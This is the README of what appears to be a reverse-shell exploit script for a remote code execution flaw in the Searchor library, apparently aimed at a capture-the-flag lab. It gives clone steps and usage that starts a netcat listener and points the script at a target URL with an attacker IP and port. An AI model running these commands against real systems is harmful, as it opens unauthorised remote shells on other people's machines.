# Basic usage

## Installation

```bash
git clone https://github.com/874anthony/searchor-rce-script.git
cd searchor-rce-script
chmod +x searchor-rce.sh
```

## Usage

```bash
nc -lvnp 2566 (In another terminal)
./searchor-rce.sh -u http://example.com -h 10.10.14.176 -p 2566
```

## Credits

This script was based on this [issue](https://github.com/ArjunSharda/Searchor/pull/130)
